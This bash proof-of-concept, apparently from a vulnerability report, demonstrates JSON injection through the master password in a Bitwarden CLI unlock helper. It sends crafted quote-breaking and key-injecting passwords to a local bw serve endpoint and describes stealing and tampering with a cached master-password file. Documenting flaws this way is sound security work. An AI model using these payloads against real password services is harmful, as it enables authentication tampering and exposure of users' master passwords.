#!/bin/bash
# ============================================================
# PoC #1 — JSON Injection via Master Password (CRITICAL)
# Vulnerability: bin/unlock.sh:40
#
# The master password is spliced raw into a JSON string literal:
#
#   curl -d '{"password": "'"${p}"'"}' "${API}"/unlock
#
# A password containing a double-quote terminates the JSON string
# early, allowing injection of arbitrary JSON fields.
#
# This PoC demonstrates two payloads:
#   A) A password that breaks JSON structure (syntax error → auth DoS)
#   B) A password that injects an extra JSON key into the request body
#
# To observe the impact, run against a live `bw serve` instance.
# The script shows exactly what malformed JSON reaches the API.
# ============================================================

API="${API:-http://localhost:8087}"

banner() { echo; echo "=== $* ==="; echo; }

# ---------- helpers ----------
build_payload() {
    local p="$1"
    # Reproduce the exact concatenation from unlock.sh:40
    echo '{"password": "'"${p}"'"}'
}

validate_json() {
    local payload="$1"
    if echo "${payload}" | python3 -c "import sys,json; json.load(sys.stdin)" 2>/dev/null; then
        echo "[VALID JSON]   ${payload}"
    else
        echo "[BROKEN JSON]  ${payload}"
    fi
}

# ---------- Payload A: syntax-breaking password ----------
banner "Payload A — Quote-break (authentication DoS)"

PASS_A='correct-horse-battery"'   # trailing quote closes JSON string early

PAYLOAD_A=$(build_payload "${PASS_A}")
echo "Password : ${PASS_A}"
echo "Payload  : ${PAYLOAD_A}"
validate_json "${PAYLOAD_A}"

echo
echo "Sending to ${API}/unlock ..."
RESPONSE_A=$(curl -s -o /dev/null -w "%{http_code}" \
    -H 'Content-Type: application/json' \
    -d "${PAYLOAD_A}" \
    "${API}"/unlock 2>/dev/null)
echo "HTTP status: ${RESPONSE_A}"
echo
echo "RESULT: Server receives malformed JSON — unlock fails even if password"
echo "        would otherwise be correct.  Any user whose master password"
echo "        contains a double-quote cannot unlock the vault."

# ---------- Payload B: JSON key injection ----------
banner "Payload B — Extra field injection"

# Close the password value, inject a new key, then open a dummy string
# to absorb the trailing quote that the template appends.
#
#   Template:  {"password": "PASSWORD"}
#   Injected:  {"password": "", "injected_key": "VALUE", "x": ""}
#
PASS_B='", "injected_key": "INJECTED_VALUE", "x": "'

PAYLOAD_B=$(build_payload "${PASS_B}")
echo "Password : ${PASS_B}"
echo "Payload  : ${PAYLOAD_B}"
validate_json "${PAYLOAD_B}"

echo
echo "Sending to ${API}/unlock ..."
RESPONSE_B=$(curl -s \
    -H 'Content-Type: application/json' \
    -d "${PAYLOAD_B}" \
    "${API}"/unlock 2>/dev/null)
echo "API response: ${RESPONSE_B}"
echo
echo "RESULT: The server receives {\"password\":\"\",\"injected_key\":\"INJECTED_VALUE\",...}."
echo "        The attacker controls additional JSON fields in the request body."
echo "        Impact depends on how bw serve parses unexpected keys;"
echo "        at minimum the intended password is replaced with an empty string."

# ---------- Payload C: demonstrate with a realistic T&T scenario ----------
banner "Payload C — Realistic scenario (cached password tampered on disk)"

echo "The Touch ID flow stores the master password at ~/bwpass.\${USER}."
echo "An attacker with file-read access can:"
echo "  1. Read ~/bwpass.<victim>  →  obtain the real password"
echo "  2. Write a crafted payload back to the file"
echo "  3. The next unlock() call injects the attacker's JSON into /unlock"
echo
echo "Crafted bwpass file content that would be read as \${p}:"
EVIL_PASS='harmless", "type": "evil"
'   # newline intentional — see how echo writes it
printf '%s' "${EVIL_PASS}" | cat -A
echo
echo "Resulting curl -d payload:"
build_payload "${EVIL_PASS}"
